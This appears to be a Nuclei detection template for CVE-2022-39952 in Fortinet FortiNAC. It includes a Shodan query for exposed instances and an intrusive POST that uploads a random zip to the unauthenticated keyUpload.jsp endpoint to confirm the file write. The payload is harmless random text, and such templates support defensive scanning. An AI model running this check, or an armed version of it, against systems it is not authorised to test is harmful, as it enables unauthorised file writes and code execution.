id: CVE-2022-39952
info:
  name: Fortinet FortiNAC - Arbitrary File Write
  author: dwisiswant0
  severity: critical
  description: Fortinet FortiNAC is vulnerable to arbitrary file write, allowing attackers
    to execute unauthorized operations and obtain sensitive information in affected
    versions 8.3.7 to 9.4.0.
  reference:
  - https://fortiguard.com/psirt/FG-IR-22-300
  - https://www.horizon3.ai/fortinet-fortinac-cve-2022-39952-deep-dive-and-iocs/
  - https://github.com/horizon3ai/CVE-2022-39952
  - https://nvd.nist.gov/vuln/detail/CVE-2022-39952
  remediation: Upgrade to 9.4.1, 9.2.6, 9.2.6, 9.1.8, 7.2.0 or above.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-39952
    cwe-id: CWE-610
  metadata:
    shodan-query: title:"FortiNAC"
    verified: 'true'
    impact: The impact of CVE-2022-39952 in Fortinet FortiNAC is an arbitrary file
      write vulnerability that can permit unauthorized code execution and modification
      of data, thus leading to potential loss of sensitive information and unauthorized
      operations.
    recommendation: It is highly recommended to update Fortinet FortiNAC affected
      versions to mitigate the risk of arbitrary file write and unauthorized code
      execution.
  tags: fortinet,fortinac,cve,cve2022,fileupload,rce,intrusive
variables:
  boundaryId: '{{hex_encode(rand_text_alphanumeric(16))}}'
requests:
- method: POST
  path:
  - '{{BaseURL}}/configWizard/keyUpload.jsp'
  headers:
    Content-Type: multipart/form-data; boundary={{boundaryId}}
  body: '--{{boundaryId}}

    Content-Disposition: form-data; name="key"; filename="{{to_lower(rand_text_alphanumeric(8))}}.zip"


    {{randstr}}

    --{{boundaryId}}--

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - zipUploadSuccess
    - SuccessfulUpload
    condition: and
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
